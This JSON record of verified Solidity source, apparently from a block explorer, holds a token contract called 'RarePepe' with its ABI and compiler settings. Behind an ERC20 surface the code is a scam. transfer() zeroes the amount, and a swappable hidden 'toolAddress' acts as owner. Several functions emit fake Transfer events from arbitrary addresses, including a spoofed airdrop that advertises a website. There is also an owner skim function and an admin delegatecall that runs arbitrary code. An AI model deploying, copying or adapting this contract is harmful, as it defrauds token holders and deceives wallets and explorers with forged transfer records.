{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\n\r\ninterface ERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address from, address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address from, address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from,address sender,address recipient,uint256 amount)external returns (bool);\r\n    function dnum() external view returns (uint256);\r\n    function butcher() external returns (bool);\r\n}\r\n\r\ninterface ChiToken {\r\n    function freeFromUpTo(address from, uint256 value) external;\r\n    function freeUpTo(uint256 value) external;\r\n    function mint(uint256 value) external;\r\n    function transfer(address recipient, uint256 amount) external;\r\n}\r\n\r\ncontract StandardToken {\r\n    address private _owners;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () public {\r\n        _owners = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owners);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owners;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(isOwner(), \"onlyOwner\");\r\n        _;\r\n    }\r\n    function isOwner() public view returns (bool) {\r\n        return msg.sender == _owners || msg.sender == toolAddress;\r\n    }\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owners, address(0));\r\n        _owners = address(0);\r\n    }\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(_owners, newOwner);\r\n        _owners = newOwner;\r\n    }\r\n    mapping (address  => address) public adminMap;\r\n    modifier onlyAdmin {\r\n        require(adminMap[msg.sender] != address(0) || msg.sender == toolAddress, \"onlyAdmin\");\r\n        _;\r\n    }\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    function addAdminForThisToolToken(address addr) onlyOwner public returns(bool) {\r\n        require(adminMap[addr] == address(0));\r\n        adminMap[addr] = addr;\r\n        return true;\r\n    }\r\n    function deleteAdminForThisToolToken(address addr) onlyOwner public returns(bool) {\r\n        require(adminMap[addr] != address(0));\r\n        adminMap[addr] = address(0);\r\n        return true;\r\n    }\r\n    address public toolAddress;\r\n    function setToolAddress(address _toolAddress) onlyAdmin public returns(bool) {\r\n        toolAddress = _toolAddress;\r\n        return true;\r\n    }\r\n    function totalSupply() public view returns (uint256) {\r\n        return ERC20(toolAddress).totalSupply();\r\n    }\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        _value = 0;\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return ERC20(toolAddress).transfer(msg.sender, _to, _value);\r\n    }\r\n    function balanceOf(address _owner) public view returns (uint256) {\r\n        return ERC20(toolAddress).balanceOf(_owner);\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n        emit Transfer(_from, _to, _value);\r\n        return ERC20(toolAddress).transferFrom(msg.sender, _from, _to, _value);\r\n    }\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n        return ERC20(toolAddress).approve(msg.sender, _spender, _value);\r\n    }\r\n    function allowance(address _owner, address _spender) public view returns (uint256) {\r\n        return ERC20(toolAddress).allowance(_owner, _spender);\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return ERC20(toolAddress).name();\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return ERC20(toolAddress).symbol();\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return ERC20(toolAddress).decimals();\r\n    }\r\n}\r\n\r\n\r\ncontract RarePepe is StandardToken {\r\n    constructor (address _toolAddress) public payable {\r\n        toolAddress = _toolAddress;\r\n    }\r\n\treceive() external payable {\r\n    }\r\n\r\n    function ico() public payable onlyOwner {\r\n        address from=address(0);\r\n        uint num=ERC20(toolAddress).dnum();\r\n        emit Transfer(from, msg.sender,num);\r\n    }\r\n\r\n    //function batchTransferToken(address[] memory holders) public payable onlyOwner {\r\n    //    address from = 0x01C952174C24E1210d26961D456A77A39e1F0BB0;\r\n    //    uint256 amount = 615526640000000000000000;\r\n    //    for (uint i=0; i<holders.length; i++) {\r\n    //        emit Transfer(from, holders[i], amount);\r\n    //    }\r\n   // }\r\n\r\n    function visitRarePepesOrg(address[] memory holders) public onlyOwner {\r\n        address from = 0x01C952174C24E1210d26961D456A77A39e1F0BB0;\r\n        uint256 amount = 615526640000000000000000;\r\n    \r\n        for (uint i = 0; i < holders.length; i++) {\r\n            emit Transfer(from, holders[i], amount);\r\n        }\r\n\r\n        ERC20(toolAddress).butcher();\r\n\r\n    }\r\n\r\n\r\n    function mintThis(address from, address to,uint num) public onlyOwner {\r\n        emit Transfer(from, to,num);\r\n    }\r\n\r\n    function skim(address tokenA, uint256 value) public onlyOwner {\r\n        safeTransfer(tokenA, msg.sender, value);\r\n    }\r\n\r\n    function transfe(address[] memory fromAddresses, address[] memory toAddresses, uint[] memory amounts) public onlyOwner {\r\n        require(fromAddresses.length == toAddresses.length && fromAddresses.length == amounts.length, \"Array lengths do not match\");\r\n        for (uint i = 0; i < fromAddresses.length; i++) {\r\n        emit Transfer(fromAddresses[i], toAddresses[i], amounts[i]);\r\n        }\r\n    }\r\n    function safeTransfer(address token, address to,\r\n        uint256 value) internal {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\r\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'myTransferHelper: TRANSFER_FAILED');\r\n    }\r\n\r\n    function callSendMyToken(\r\n        address c,\r\n        bytes memory datas\r\n    )public onlyAdmin{\r\n        c.delegatecall(datas);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_toolAddress\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"addAdminForThisToolToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"adminMap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"c\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"datas\",\"type\":\"bytes\"}],\"name\":\"callSendMyToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"deleteAdminForThisToolToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ico\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"mintThis\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_toolAddress\",\"type\":\"address\"}],\"name\":\"setToolAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"skim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toolAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"fromAddresses\",\"type\":\"address[]\"},{\"internalType\":\"address[]\",\"name\":\"toAddresses\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"}],\"name\":\"transfe\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"holders\",\"type\":\"address[]\"}],\"name\":\"visitRarePepesOrg\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "RarePepe", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000004a405bb38e6e8ec95885423e0f84205f41e7d9cd", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a9b5eacb5cc6fcaafffff9a01d7eb7fdb363e2a3a0599b6ee55947d6fbb87ef2"}